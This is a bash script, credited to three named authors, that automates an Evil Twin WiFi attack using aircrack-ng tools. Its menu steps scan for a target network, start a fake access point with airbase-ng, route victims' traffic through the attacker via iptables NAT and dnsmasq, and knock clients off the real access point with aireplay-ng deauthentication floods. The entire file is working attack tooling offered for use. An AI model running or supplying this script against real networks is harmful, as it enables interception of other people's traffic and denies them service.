#!/bin/bash
###########################################################################
#####Authors: Alexand Melnikov, Alexey Sysoev, Sergei Puzan################
#####Nicknames: Doctor D. Ildo, Turtle Titan, Brokendick Counterstrike#####
###########################################################################
function option0(){
	echo ""
	echo "Enter your monitor mode interface (wlan1mon): "
	read interface
}

function option1(){
	sudo airodump-ng $interface   &
	wait
}

function option2(){
	bssid=''
	while [ -z $bssid ]; do
		echo "Enter the BSSID: "
		read bssid
	done

	channel=''
	while [ -z $channel ]; do
		echo "Enter the Channel: "
		read channel
	done
	
	
	echo "Write File Prefix: "
	read writeFilePrefix
	if [ -z $writeFilePrefix ]; then
		echo "No Write File Specified"
	else
		writeFile=" -w $writeFilePrefix"
	fi
	

	sleep 3

	sudo airodump-ng --bssid $bssid -c $channel $writeFile $interface   &
	wait
}

function option3(){
	options3=''
	echo "Time to set up the Evil Twin AP!!!"
	sleep 2
	echo "Evil Twin ESSID: "
	read etEssid
	if [ -z $etEssid ]; then
		echo "ESSID not set"
	else
		options3="$options3 --essid $etEssid"
	fi
	echo "Evil Twin BSSID[optional]: "
	read etBssid
	if [ -z $etBssid ]; then
		echo "BSSID not set"
	else
		options3="$options3 -a $etBssid"
	fi
	echo "Enter the Channel: "
	read etChannel
	if [ -z $etChannel ]; then
		echo "Channel not set"
	else
		options3="$options3 -c $etChannel"
	fi
	echo "Enter the host MAC(client connected to target AP)[optional]: "
	read etHost
	if [ -z $etHost ]; then
		echo "Host MAC not set"
	else
		options3="$options3 -h $etHost"
	fi
	echo "Enter any other options (refer to man airbase-ng...)[optional]:"
	read otherOptions
	if [ -z $otherOptions ]; then
		echo "No other options set"
	else
		options3="$options3 $otherOptions"
	fi
	sleep 3

	

	echo "Killing Airbase-ng..."
	pkill airbase-ng
	sleep 2;
	echo "Killing DHCP..."
	pkill dhcpd
	sleep 5;
	#echo $options3
	echo "Starting Fake AP..."
	sudo airbase-ng $options3 $interface   &

	sleep 2
	echo "Initiating at0 interface"	
	ifconfig at0 up

	ifconfig at0 10.0.0.1 netmask 255.255.255.0
	route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1

	iptables -P FORWARD ACCEPT
	iptables -t nat -A POSTROUTING -o wlan0mon -j MASQUERADE

	echo 1 >  /proc/sys/net/ipv4/ip_forward
	dnsmasq -C dnsmasq.conf -d
}
function option4(){
	deauthType=''
	while [ -z $deauthType ]; do
		echo "Would you like to run a basic deauth attack? (--deauth 100)"
		echo "[1] Yes"
		echo "[2] No"
		read deauthType
	done
	echo "you selected $deauthType"
	if [ $deauthType = 1 ]; then
		sudo aireplay-ng --deauth 100 -a $bssid $interface &
	fi
	
	if [ $deauthType = 2 ]; then
		echo "Enter your aireplay-ng options, you must add the -a tag, and DO NOT include the interface"
		read options4
		sudo aireplay-ng $options4 $interface &
	fi
	wait
}
function option5(){
	echo "Killing airbase-ng"
	pkill airbase-ng
	sleep 1
	echo "Killing dhcpd"
	pkill dhcpd
	sleep 1
	echo "Killing aireplay-ng"
	pkill aireplay-ng
	sleep 1
	echo "Killing airodump-ng"
	pkill airodump-ng
	sleep 1
	echo "sleeping..."
	sleep 2
	exit
}
function menu(){
	echo "What would you like to do?"
	echo "[0] set up interface"
	echo "[1] find the target"
	echo "[2] hone in on target"
	echo "[3] set up Evil-Twin AP"
	echo "[4] deauth the target AP"
	echo "[5] exit"
	read userInput

	
}
function userAction(){
	case $userInput in
		0) option0 ;;
		1) option1 ;;
		2) option2 ;;
		3) option3 ;;
		4) option4 ;;
		5) option5 ;;
	esac
}

echo ""
echo "You MUST set your usb Wifi adapter in monitor mode first"
echo "Then follow the steps 1-5"
echo "This will help set up an Evil Twin AP"
echo ""
echo ""
echo ""
sleep 3
uI=0;
interface=''
while [ -z $interface ]; do
	option0
done

until [ $uI = 5 ]; do
	menu
	uI=$userInput
	#echo "you selected  $uI  hello"
	userAction
done



